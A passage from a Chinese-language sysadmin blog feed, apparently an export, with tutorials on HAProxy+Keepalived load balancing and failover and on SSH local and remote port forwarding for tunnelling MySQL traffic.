class="line"></span><br><span class="line">echo -e &quot;net.ipv4.tcp_keepalive_time = 120&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line">echo -e &quot;net.ipv4.tcp_keepalive_probes = 3&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line">echo -e &quot;net.ipv4.tcp_keepalive_intvl = 15&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line">echo -e &quot;net.ipv4.tcp_max_tw_buckets = 200000&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line">echo -e &quot;net.ipv4.tcp_max_orphans = 3276800&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line">echo -e &quot;net.ipv4.tcp_max_syn_backlog = 262144&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line">echo -e &quot;net.ipv4.tcp_wmem = 8192 131072 16777216&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line">echo -e &quot;net.ipv4.tcp_rmem = 32768 131072 16777216&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line">echo -e &quot;net.ipv4.tcp_mem = 94500000 915000000 927000000&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line">echo -e &quot;net.ipv4.ip_conntrack_max = 25000000&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line">echo -e &quot;net.ipv4.netfilter.ip_conntrack_max = 25000000&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line">echo -e &quot;net.ipv4.netfilter.ip_conntrack_tcp_timeout_established = 180&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line">echo -e &quot;net.ipv4.netfilter.ip_conntrack_tcp_timeout_time_wait = 1&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line">echo -e &quot;net.ipv4.netfilter.ip_conntrack_tcp_timeout_close_wait = 60&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line">echo -e &quot;net.ipv4.netfilter.ip_conntrack_tcp_timeout_fin_wait = 120&quot; &gt;&gt; /etc/sysctl.conf</span><br></pre></td></tr></table></figure>

<h2 id="测试验证"><a href="#测试验证" class="headerlink" title="测试验证"></a>测试验证</h2><h4 id="测试HAProxy-Keepalived是否正常运行"><a href="#测试HAProxy-Keepalived是否正常运行" class="headerlink" title="测试HAProxy+Keepalived是否正常运行"></a><strong>测试HAProxy+Keepalived是否正常运行</strong></h4><h6 id="打开HAProxy监控页面"><a href="#打开HAProxy监控页面" class="headerlink" title="打开HAProxy监控页面"></a>打开HAProxy监控页面</h6><p><a href="http://bbs.osyunwei.com/haproxy-status" target="_blank" rel="noopener">http://bbs.osyunwei.com/haproxy-status</a></p>
<p>输入用户名/密码： admin/123456</p>
<p>登录之后如下图所示</p>
<p><img src="/articles/c0e454fd/2883.jpg" alt="2883"></p>
<p><img src="/articles/c0e454fd/2884.jpg" alt="2884"></p>
<h6 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h6><p>bbs.osyunwei.com 解析到192.168.21.253；</p>
<p>sns.osyunwei.com 解析到192.168.21.254；</p>
<p>在两台HAProxy服务器：192.168.21.129、192.168.21.130上执行命令：ip addr</p>
<p>如下图所示:</p>
<p><img src="/articles/c0e454fd/2885.jpg" alt="2885"></p>
<p><img src="/articles/c0e454fd/haproxy-keepalived%E5%AE%9E%E7%8E%B0Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%5C2886.jpg" alt="2886"></p>
<p>可以看出现在VIP：192.168.21.253指向192.168.21.129；VIP：192.168.21.254指向192.168.21.130；</p>
<p>在浏览器中打开</p>
<p><a href="http://bbs.osyunwei.com/" target="_blank" rel="noopener">http://bbs.osyunwei.com/</a></p>
<p><a href="http://sns.osyunwei.com/" target="_blank" rel="noopener">http://sns.osyunwei.com/</a></p>
<p>如下图所示：</p>
<p><img src="/articles/c0e454fd/2887.jpg" alt="2887"></p>
<p>此时，bbs和sns域名都被均衡到192.168.21.127上面</p>
<h6 id="停止192-168-21-127上面的nginx服务"><a href="#停止192-168-21-127上面的nginx服务" class="headerlink" title="停止192.168.21.127上面的nginx服务"></a>停止192.168.21.127上面的nginx服务</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service nginx stop</span><br></pre></td></tr></table></figure>

<p>继续打开上面的两个网址，如下图所示：</p>
<p><img src="/articles/c0e454fd/2888.jpg" alt="2888"></p>
<p>此时，bbs和sns域名都被均衡到192.168.21.128上面（由于192.168.21.127服务器nginx服务被关闭，实现了故障转移）</p>
<h6 id="关闭192-168-21-129上面的keepalived服务"><a href="#关闭192-168-21-129上面的keepalived服务" class="headerlink" title="关闭192.168.21.129上面的keepalived服务"></a>关闭192.168.21.129上面的keepalived服务</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service  keepalived  stop</span><br></pre></td></tr></table></figure>

<p>此时，在两台HAProxy服务器：192.168.21.129、192.168.21.130上执行命令：ip addr</p>
<p>如下图所示：</p>
<p><img src="/articles/c0e454fd/2889.jpg" alt="2889"></p>
<p><img src="/articles/c0e454fd/2890.jpg" alt="2890"></p>
<p>可以看出VIP：192.168.21.253和192.168.21.254均指向到192.168.21.130；</p>
<p>此时，打开<a href="http://bbs.osyunwei.com/如下图所示：" target="_blank" rel="noopener">http://bbs.osyunwei.com/如下图所示：</a></p>
<p><img src="/articles/c0e454fd/2891.jpg" alt="2891"></p>
<p>可以正常访问</p>
<h6 id="恢复192-168-21-129上面的keepalived服务，恢复192-168-21-127上面的nginx服务"><a href="#恢复192-168-21-129上面的keepalived服务，恢复192-168-21-127上面的nginx服务" class="headerlink" title="恢复192.168.21.129上面的keepalived服务，恢复192.168.21.127上面的nginx服务"></a>恢复192.168.21.129上面的keepalived服务，恢复192.168.21.127上面的nginx服务</h6><p>停止192.168.21.130上面的Keepalived服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service keepalived stop</span><br></pre></td></tr></table></figure>

<p>在两台HAProxy服务器：192.168.21.129、192.168.21.130上执行命令：ip addr</p>
<p>如下图所示：</p>
<p><img src="/articles/c0e454fd/2892.jpg" alt="2892"></p>
<p><img src="/articles/c0e454fd/2893.jpg" alt="2893"></p>
<p>可以看出VIP：192.168.21.253和192.168.21.254均指向到192.168.21.129；</p>
<p>此时，打开<a href="http://sns.osyunwei.com/如下图所示：" target="_blank" rel="noopener">http://sns.osyunwei.com/如下图所示：</a></p>
<p><img src="/articles/c0e454fd/2894.jpg" alt="2894"></p>
<p>可以正常访问</p>
<p>备注：</p>
<p>查看HAProxy日志文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tail -f /var/log/haproxy.log</span><br></pre></td></tr></table></figure>

<p><strong>至此，HAProxy+Keepalived实现Web服务器负载均衡配置完成。</strong></p>
]]></content>
      <categories>
        <category>运维技术</category>
        <category>服务部署</category>
      </categories>
      <tags>
        <tag>Haproxy</tag>
        <tag>Keepalived</tag>
      </tags>
  </entry>
  <entry>
    <title>haproxy+keepalived实现高可用负载均衡</title>
    <url>/articles/9ad4df0e.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>在运维的日常工作中和很多服务打交道，为了保证各个服务健康稳定运行，高可用和高负载是在一个服务搭建好后，必须要考虑的问题。本文介绍了一种常用的高可用和负载均衡的解决方案：KA+HA(haproxy+keepalived)</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>haproxy keepalived  主：192.168.1.192<br>haproxy keepalived  备：192.168.1.193<br>vip：192.168.1.200<br>web：192.168.1.187:80 </p>
<p>​            192.168.1.187:8000</p>
<h2 id="架构图"><a href="#架构图" class="headerlink" title="架构图"></a>架构图</h2><p><img src="/articles/9ad4df0e/0.115069789831175.png" alt="img"></p>
<a id="more"></a>

<h2 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h2><p>在192.168.1.192上：<br><strong>keepalived</strong>的安装:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -zxvf keepalived-1.1.17.tar.gz</span><br><span class="line">ln -s /usr/src/kernels/2.6.18-128.el5-i686/ /usr/src/linux</span><br><span class="line"><span class="built_in">cd</span> keepalived-1.1.17</span><br><span class="line">./configure --prefix=/ --mandir=/usr/<span class="built_in">local</span>/share/man/ --with-kernel-dir=/usr/src/kernels/2.6.18-128.el5-i686/</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"><span class="built_in">cd</span> /etc/keepalived/</span><br><span class="line">mv keepalived.conf keepalived.conf.default</span><br><span class="line">vim keepalived.conf</span><br><span class="line"></span><br><span class="line">! Configuration File <span class="keyword">for</span> keepalived</span><br><span class="line">vrrp_script chk_http_port &#123;</span><br><span class="line">script <span class="string">"/etc/keepalived/check_haproxy.sh"</span></span><br><span class="line">interval 2</span><br><span class="line">weight 2</span><br><span class="line"></span><br><span class="line">global_defs &#123;</span><br><span class="line">router_id LVS_DEVEL</span><br><span class="line">&#125;</span><br><span class="line">vrrp_instance VI_1 &#123;</span><br><span class="line">state MASTER <span class="comment">#192.168.1.193上改为BACKUP</span></span><br><span class="line">interface eth0</span><br><span class="line">virtual_router_id 51 </span><br><span class="line">priority 150 <span class="comment">#192.168.1.193上改为120</span></span><br><span class="line">advert_int 1</span><br><span class="line">authentication &#123;</span><br><span class="line">auth_type PASS</span><br><span class="line">auth_pass 1111</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">track_script &#123;</span><br><span class="line">chk_http_port</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">virtual_ipaddress &#123;</span><br><span class="line">192.168.1.200 </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vi /etc/keepalived/check_haproxy.sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">A=`ps -C haproxy --no-header |wc -l`</span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$A</span> -eq 0 ];<span class="keyword">then</span></span><br><span class="line">/usr/<span class="built_in">local</span>/haproxy/sbin/haproxy -f /usr/<span class="built_in">local</span>/haproxy/conf/haproxy.cfg</span><br><span class="line">sleep 3</span><br><span class="line"><span class="keyword">if</span> [ `ps -C haproxy --no-header |wc -l` -eq 0 ];<span class="keyword">then</span></span><br><span class="line">/etc/init.d/keepalived stop</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">chmod 755 /etc/keepalived/check_haproxy.sh</span><br></pre></td></tr></table></figure>

<p><strong>haproxy</strong>的安装(主备都一样)：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -zxvf haproxy-1.4.9.tar.gz</span><br><span class="line"><span class="built_in">cd</span> haproxy-1.4.9</span><br><span class="line">make TARGET=linux26 PREFIX=/usr/<span class="built_in">local</span>/haproxy install</span><br><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/haproxy/</span><br><span class="line">mkdir conf logs</span><br><span class="line"><span class="built_in">cd</span> conf</span><br><span class="line">vim haproxy.cfg</span><br><span class="line"></span><br><span class="line">global</span><br><span class="line"><span class="built_in">log</span> 127.0.0.1 local3 info</span><br><span class="line">maxconn 4096</span><br><span class="line">user nobody</span><br><span class="line">group nobody</span><br><span class="line">daemon</span><br><span class="line">nbproc 1</span><br><span class="line">pidfile /usr/<span class="built_in">local</span>/haproxy/logs/haproxy.pid</span><br><span class="line"></span><br><span class="line">defaults</span><br><span class="line">maxconn 2000</span><br><span class="line">contimeout 5000</span><br><span class="line">clitimeout 30000</span><br><span class="line">srvtimeout 30000</span><br><span class="line">mode http</span><br><span class="line"><span class="built_in">log</span> global</span><br><span class="line"><span class="built_in">log</span> 127.0.0.1 local3 info</span><br><span class="line">stats uri /admin?stats</span><br><span class="line">option forwardfor</span><br><span class="line"></span><br><span class="line">frontend http_server</span><br><span class="line"><span class="built_in">bind</span> :80</span><br><span class="line"><span class="built_in">log</span> global</span><br><span class="line">default_backend info_cache</span><br><span class="line">acl <span class="built_in">test</span> hdr_dom(host) -i test.domain.com</span><br><span class="line">use_backend cache_test <span class="keyword">if</span> <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">backend info_cache</span><br><span class="line"><span class="comment">#balance roundrobin</span></span><br><span class="line">balance <span class="built_in">source</span></span><br><span class="line">option httpchk HEAD /haproxy.txt HTTP/1.1\r\nHost:192.168.1.187</span><br><span class="line">server inst2 192.168.1.187:80 check inter 5000 fall 3</span><br><span class="line"></span><br><span class="line">backend cache_test</span><br><span class="line">balance roundrobin</span><br><span class="line"><span class="comment">#balance source</span></span><br><span class="line">option httpchk HEAD /haproxy.txt HTTP/1.1\r\nHost:test.domain.com</span><br><span class="line">server inst1 192.168.1.187:8000 check inter 5000 fall 3</span><br></pre></td></tr></table></figure>

<h2 id="两台机器上分别启动"><a href="#两台机器上分别启动" class="headerlink" title="两台机器上分别启动"></a>两台机器上分别启动</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/etc/init.d/keepalived start （这条命令会自动把haproxy启动）</span><br></pre></td></tr></table></figure>

<h2 id="验证测试"><a href="#验证测试" class="headerlink" title="验证测试"></a>验证测试</h2><h4 id="两台机器上分别执行"><a href="#两台机器上分别执行" class="headerlink" title="两台机器上分别执行"></a>两台机器上分别执行</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ip add</span><br></pre></td></tr></table></figure>

<p>主: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000<br>link/ether 00:0c:29:98:cd:c0 brd ff:ff:ff:ff:ff:ff<br>inet 192.168.1.192/24 brd 192.168.1.255 scope global eth0<br><strong>inet 192.168.1.200/32 scope global eth0</strong><br>inet6 fe80::20c:29ff:fe98:cdc0/64 scope link<br>valid_lft forever preferred_lft forever</p>
<p>备: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000<br>link/ether 00:0c:29:a6:0c:7e brd ff:ff:ff:ff:ff:ff<br>inet 192.168.1.193/24 brd 255.255.255.254 scope global eth0<br>inet6 fe80::20c:29ff:fea6:c7e/64 scope link<br>valid_lft forever preferred_lft forever</p>
<h4 id="停掉主上的haproxy"><a href="#停掉主上的haproxy" class="headerlink" title="停掉主上的haproxy"></a>停掉主上的haproxy</h4><p>3秒后keepalived会自动将其再次启动</p>
<h4 id="停掉主的keepalived"><a href="#停掉主的keepalived" class="headerlink" title="停掉主的keepalived"></a>停掉主的keepalived</h4><p>备机马上接管服务<br>备: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000<br>link/ether 00:0c:29:a6:0c:7e brd ff:ff:ff:ff:ff:ff<br>inet 192.168.1.193/24 brd 255.255.255.254 scope global eth0<br><strong>inet 192.168.1.200/32 scope global eth0</strong><br>inet6 fe80::20c:29ff:fea6:c7e/64 scope link<br>valid_lft forever preferred_lft forever</p>
<h4 id="更改hosts"><a href="#更改hosts" class="headerlink" title="更改hosts"></a>更改hosts</h4><p>192.168.1.200 test.com<br>192.168.1.200 test.domain.com<br>通过IE测试，可以发现<br>test.com的请求发向了192.168.1.187:80<br>test.domain.com的请求发向了192.168.1.187:8000<br><img src="/articles/9ad4df0e/0.6843823240075992.png" alt="img"></p>
<p><img src="/articles/9ad4df0e/0.9408829897802136.png" alt="img"></p>
]]></content>
      <categories>
        <category>运维技术</category>
        <category>服务部署</category>
      </categories>
      <tags>
        <tag>Haproxy</tag>
        <tag>Keepalived</tag>
      </tags>
  </entry>
  <entry>
    <title>ssh端口转发：ssh隧道</title>
    <url>/articles/b406f6c6.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>“ssh端口转发”还有一个更加形象的名字，叫做”ssh隧道”，当然，只是纯粹的通过”ssh隧道”这几个字去理解它可能不太容易，我们来描述一些实际的场景，在这些场景中我们可能会遇到一些问题，而这些问题可以通过”ssh隧道”解决，通过这样的方式，我们反而更加容易理解”ssh隧道”是什么以及它的作用。</p>
<p>假如我们现在有两个台主机，主机A与主机B，主机A上安装有mysql客户端，主机B上安装有mysql服务端，现在，主机A中的mysql客户端需要与主机B中的mysql服务端进行通讯，则需要从mysql的客户端连接到mysql服务端。如下图所示</p>
<p><img src="/articles/b406f6c6/1.png" alt="ssh端口转发：ssh隧道"></p>
<p>然而我们知道，mysql在传输数据时是进行明文传输的，如果主机A与主机B只能通过公网进行通讯，那么暴露在公网的mysql通讯是非常不安全的，所以，我们需要借助一些手段，提高访问mysql服务时的安全性，比如，我们可以使用SSL证书为数据加密，或者使用stunnel加密隧道，我们还可以使用VPN，当然，这些方法都不是这篇文章所要描述的重点，我们此处要总结的是”ssh隧道”这种方法，我们可以利用ssh，搭建出一条”通道”，然后将mysq的客户端与服务端通过这条”ssh通道”连接起来，如下图所示</p>
<p><img src="/articles/b406f6c6/2.png" alt="ssh端口转发：ssh隧道"></p>
<p>mysql的客户端与服务端的连接方式从原来直连的方式变成了如上图所示的连接方式，它们之间并不直接进行通讯，而是借助ssh隧道将通讯数据转发，虽然仍然跨越了公网，但是由于ssh本身的安全特性，所以别人无法看到明文传输的数据，数据依靠ssh隧道实现了加密的效果，达到了保护数据安全的作用，提升了mysql的客户端与服务端通讯的安全性。</p>
<a id="more"></a>



<h2 id="本地转发"><a href="#本地转发" class="headerlink" title="本地转发"></a>本地转发</h2><p>经过上述描述，我想你对”ssh隧道”应该已经有了初步的理解，那么现在我们来实际动手配置一下。</p>
<p>首选，将实验环境准备好，两台主机的信息如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ServerA：10.1.0.1</span><br><span class="line"></span><br><span class="line">ServerB：10.1.0.2</span><br><span class="line"></span><br><span class="line">ServerA中并不存在mysql服务。</span><br><span class="line"></span><br><span class="line">ServerB中已经安装了mysql服务，mysql服务已经启动并监听了3306端口。</span><br></pre></td></tr></table></figure>

<p>现在，我们只要在ServerA中执行如下命令，即可在ServerA与ServerB之间建立一条ssh隧道，执行如下命令时会提示输入ServerB的密码</p>
<p><img src="/articles/b406f6c6/3.png" alt="ssh端口转发：ssh隧道"></p>
<p>如上图所示，执行上图中的命令后，我们直接从主机A连接到了主机B，这条连接就是我们创建的”ssh隧道”。</p>
<p>我们先来简单的解释一下上图中命令的含义，为了方便解释，我们把命令分成3部分理解，如下图所示。</p>
<p><img src="/articles/b406f6c6/4.png" alt="ssh端口转发：ssh隧道"></p>
<p>第1部分为-L选项，-L 选项表示使用”本地转发”建立ssh隧道，本地转发是什么意思呢？</p>
<p>“本地转发”表示本地的某个端口上的通讯数据会被转发到目标主机的对应端口，你可以把它抽象的理解成一种”映射”，注意，我们把执行上述命令的主机称为”本地主机”。</p>
<p>比如，访问本地(当前主机)的端口A，就相当于访问目标主机的端口B，因为当你访问本地的端口A时，通讯数据会被转发到目标主机的端口B，这就是本地转发，其实，”本地转发”是与”远程转发”相对应的，但是我们还没有介绍到远程转发，所以并不用在意那么多，我们只要先了解本地转发的作用就行了。</p>
<p>刚才说过，”本地转发”表示本地的某个端口上的通讯数据会被转发到目标主机的对应端口，那么你一定能够理解上述命令中第2部分的含义了</p>
<p>第2部分表示：通讯数据会从本地的9906端口上被转发，最终被转发到10.1.0.2的3306端口。</p>
<p>第3部分表示：我们创建的ssh隧道是连接到10.1.0.2上的root用户的，其实，第3部分可以与之前的ssh连在一起去理解，比如，ssh <a href="mailto:root@10.1.0.2" target="_blank" rel="noopener">root@10.1.0.2</a>，其实就是使用ssh命令从ServerA中连接到ServerB的root用户，这就是为什么执行上述命令以后，会提示我们输入10.1.0.2中root用户的密码，当然，如果你已经在ServerB中配置好了ServerA对应用户的公钥，那么则可以省去输入密码的步骤直接连接，此时，ServerA的角色是ssh的客户端，ServerB的角色是ssh的服务端，而这条ssh隧道就是建立在ServerA与ServerB之间的。</p>
<p>了解完上述命令的3个部分，我们来把它当做一个整体去理解一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -L 9906:10.1.0.2:3306 root@10.1.0.2</span><br></pre></td></tr></table></figure>

<p>上述命令表示从本机(ServerA)建立一个到ServerB(10.1.0.2)的ssh隧道，使用本地端口转发模式，监听ServerA本地的9906端口，访问本机的9906端口时，通讯数据将会被转发到ServerB(10.1.0.2)的3306端口。</p>
<p>好了，命令解释完了，现在我们来试试实际的使用效果，注意，此刻我们已经创建了ssh隧道，从serverA中已经连接到了ServerB，不要退出这个ssh连接，否则刚才创建的ssh隧道将会消失（稍后会介绍怎样后台建立连接），此刻，我们再打开一个新的ssh连接，连接到ServerA，如下图所示</p>
<p><img src="/articles/b406f6c6/5.png" alt="ssh端口转发：ssh隧道"></p>
<p>在新链接中查看对应的端口号，本地回环地址的9906端口已经被监听了（稍后介绍怎样监听ServerA中指定的IP，即非本地回环地址）。</p>
<p>此时，我们直接在ServerA中通过mysql命令访问127.0.0.1的9906端口，就相当于访问ServerB的mysql服务了，我们来试试。</p>
<p>执行mysql命令时需要指定IP与端口号，因为我的ServerB中的mysql只是用于测试，所以没有为用户设置密码，如下图即可连接</p>
<p><img src="/articles/b406f6c6/6.png" alt="ssh端口转发：ssh隧道"></p>
<p>如上图所示，已经可以正常在ServerA中连接到数据库，但是连接的数据库其实是ServerB中的mysql服务。</p>
<p>这就是通过ssh隧道访问远程主机的mysql服务的示例，这样做就是利用ssh的安全特性加密了mysql的通讯数据。</p>
<p>在没有使用ssh隧道时，直接从ServerA跨越公网访问ServerB的mysql服务时，如果在ServerB中通过抓包工具对通讯网卡进行抓包，可以直接从抓到的数据包中看到mysql的传输数据。</p>
<p>但是如果使用了ssh隧道，并且在ServerB中仅对通讯网卡进行抓包时，则只能看到经过加密的ssh数据包，此时，如果对ServerB的本地回环网卡同时进行抓包，则可以看到未加密的mysql传输数据，不过，这并不影响mysql通讯数据跨越公网时的安全性，因为这时已经是ServerB本机中的数据传输了，也就是说，mysql通讯数据在跨越公网时，是经过ssh隧道加密的，mysql通讯数据到达ServerB本机以后，是明文传输的。</p>
<p>不过，当我们执行上述命令创建ssh隧道时，总会从ServerA中连接到ServerB中，而通常，我们只希望建立ssh隧道，并不会使用到这个新建立的ssh连接，而且在实际使用中，我们往往会在建立隧道以后，退出当前的ssh会话，所以，上述命令并不能满足我们的需求，因为，我们一旦退出对应的ssh会话，相应的ssh隧道也会消失，所以，我们还需要配合另外两个选项，”-N选项”与”-f选项”，我们一一道来。</p>
<p>首先来试试”-N选项”，当配合此选项创建ssh隧道时，并不会打开远程shell连接到目标主机，我们来试试，如下图所示，配合-N选项创建隧道，输入ServerB的密码以后，并没有连接到ServerB，而是停留在了如下图的位置</p>
<p><img src="/articles/b406f6c6/7.png" alt="ssh端口转发：ssh隧道"></p>
<p>此时，再打开一个新的ssh会话连接到ServerA，可以看到，9906端口已经被监听。</p>
<p>但是，这样仍然不能满足我们的要求，虽然建立隧道时并没有连接到ServerB，但是，我们仍然不能关闭创建ssh隧道时所使用的ssh会话。</p>
<p>这时，只要配合”-f”选项即可，”-f”选项表示后台运行ssh隧道，即使我们关闭了创建隧道时所使用的ssh会话，对应的ssh隧道也不会消失，”-f”选项需要跟”-N”选项配合使用，所以通常，我们会使用如下命令创建ssh隧道</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -f -N -L 9906:10.1.0.2:3306 root@10.1.0.2</span><br></pre></td></tr></table></figure>

<p>配合上述选项创建ssh隧道时，即使我们完全关闭了执行命令时的ssh会话，对应创建的隧道也可以完全正常运行。</p>
<p>不过，当我们使用上述命令建立隧道时，只有127.0.0.1这个回环地址的9906端口会被监听，这样就会出现一个小问题，也就是说，我们只能在ServerA本机上访问9906端口，并不能通过其他主机访问ServerA的9906端口，因为ServerA其他IP的9906端口并未被监听，那么怎么办呢？很简单，使用如下命令，即可让9906端口监听在ServerA中指定的IP上</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -f -N -L 10.1.0.1:9906:10.1.0.2:3306 root@10.1.0.2</span><br></pre></td></tr></table></figure>

<p>在ServerA中执行上述命令时，ServerA的10.1.0.1的9906端口会被监听，此刻，我们可以通过其他主机访问10.1.0.1的9906端口，即可访问到ServerB中的mysql服务，其实，与之前的命令相比，只是在9906前增加了ServerA中对应的IP地址罢了，很简单吧。</p>
<p>如果你觉得这还不够，希望ServerA中的所有IP地址的9906端口都被监听，那么可以在建立隧道时开启”网关功能”，使用”-g”选项可以开启”网关功能”，开启网关功能以后，ServerA中的所有IP都会监听对应端口，示例如下</p>
<p><img src="/articles/b406f6c6/8.png" alt="ssh端口转发：ssh隧道"></p>
<p>好了，说了这么多，终于把ssh隧道(本地转发)给解释明白了，不过，我们也只是说明了本地转发，现在，我们来聊聊远程转发。</p>
<h2 id="远程转发"><a href="#远程转发" class="headerlink" title="远程转发"></a>远程转发</h2><p>在了解远程转发之前，请先确定你已经理解了”本地转发”。</p>
<p>老规矩，为了方便理解，我们先来描述一个场景。</p>
<p>公司有一台服务器ServerB，ServerB处于公司的内网中，公司内网中的所有主机都通过路由器访问互联网（典型的NAT网络），ServerB中有提供mysql服务，如果此时，我们想要通过外网访问到ServerB中的mysql服务，该怎么办呢？通常的做法是，通过路由器或者防火墙，将公司的固定外网IP上的某个端口映射到ServerB内网IP的3306端口上，这样，我们只要访问公司外网IP的对应端口，即可访问到内网ServerB中的mysql服务了，但是，如果你没有权限控制公司的防火墙或者路由器呢，这时该怎么办呢？</p>
<p>假设，你无法控制防火墙去进行端口映射，但是，公司在公网上有另外一台服务器ServerA，ServerA有自己的公网IP，你有权控制ServerA，这时，我们就可以利用ServerA达到我们的目的，聪明如你，一定想到了解决方案，没错，我们可以在ServerA与ServerB之间创建一条SSH隧道，利用这条隧道将ServerA中的某个端口(假设仍然使用9906端口)与ServerB中的3306端口连接起来，这样，当我们访问ServerA的9906端口时，就相当于访问到内网ServerB中的mysql服务了，那么，我们能不能使用之前的”本地转发”的方式，在ServerA中创建SSH隧道呢？我们来模拟一下，看看会不会遇到什么问题，如果想要使用之前的命令创建SSH隧道，那么我们则需要在ServerA中执行如下命令。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -f -N -L AIP:9906:BIP:3306 root@BIP</span><br></pre></td></tr></table></figure>

<p>问题来了，ServerA有自己的公网IP，我们只要把上述命令中的AIP替换成ServerA的公网IP即可，但是ServerB是内网主机，虽然ServerB能够通过公司内的路由器访问到互联网，但是ServerB并不持有任何公网IP，ServerB只有内网IP，所以，我们并不可能把上述命令中的BIP替换成B主机的内网IP，所以，使用上述命令是无法在ServerA中创建ssh隧道连接到ServerB的，那么该怎么办呢？</p>
<p>虽然我们无法从ServerA中使用ssh命令连接到ServerB，但是，我们可以从ServerB中使用ssh命令连接到ServerA啊，虽然ServerB是没有公网IP的内网主机，但是它仍然可以依靠公司的路由器访问互联网，所以，我们只要在ServerB中执行如下命令，即可从ServerB中连接到ServerA中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh root@AIP</span><br></pre></td></tr></table></figure>

<p>那么，按照这个思路，我们似乎找到了方向，我们现在需要一种方法，能够从ServerB中创建SSH隧道连接到ServerA，并且，隧道创建后，ServerA中会监听9906端口，以便别人能够通过外网访问，也就是说，我们需要一种方法，能够满足如下两个条件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">条件1：从ServerB中主动连接到ServerA，即在ServerB中执行创建隧道的命令，连接到ServerA。</span><br><span class="line"></span><br><span class="line">条件2：隧道创建后，转发端口需要监听在ServerA中，以便利用ServerA访问到内网的ServerB。</span><br></pre></td></tr></table></figure>



<p>这种方法就是”远程转发”。</p>
<p>你可能还是不太明白，没有关系，我们先来实际动手操作一下，稍后，我们会对比本地转发与远程转发的具体区别。</p>
<p>为了方便，我们仍然使用之前的实验环境，假设ServerA是外网主机，ServerB是内网主机，ServerA的IP为10.1.0.1（假设此IP为公网IP），ServerB的IP为10.1.0.2，并且已经将之前本地转发的进程关闭，相当于一个没有任何隧道的新的实验环境。</p>
<p>使用”-R选项”，可以创建一个”远程转发”模式的ssh隧道，我们在ServerB中，执行如下命令即可</p>
<p><img src="/articles/b406f6c6/9.png" alt="ssh端口转发：ssh隧道"></p>
<p>上述命令在ServerB中执行，执行后，即可在ServerA与ServerB之间建立ssh隧道，此时，ServerB是ssh客户端，ServerA是ssh服务端，隧道建立后，ServerA中的9906端口会被监听，在ServerA中查看对应端口，如下图所示</p>
<p><img src="/articles/b406f6c6/10.png" alt="ssh端口转发：ssh隧道"></p>
<p>从图中可以看出，ServerA中的9906端口已经被监听，此刻，我们通过外网IP登录到ServerA，在ServerA中访问本地回环地址的9906端口，即可访问到内网ServerB中的mysql服务，如下图所示。</p>
<p><img src="/articles/b406f6c6/11.png" alt="ssh端口转发：ssh隧道"></p>
<p>不过你肯定注意到了，当使用远程转发的命令时，我并没有指定监听ServerA的外网IP，也没有使用”-g选项”开启网关功能，这是因为，即使你在命令中指定了IP地址，最终在ServerA中还是会只监听127.0.0.1的9906端口，你可以在ServerB中尝试一下如下命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -f -N -R 10.1.0.1:9906:10.1.0.2:3306 root@10.1.0.1</span><br></pre></td></tr></table></figure>

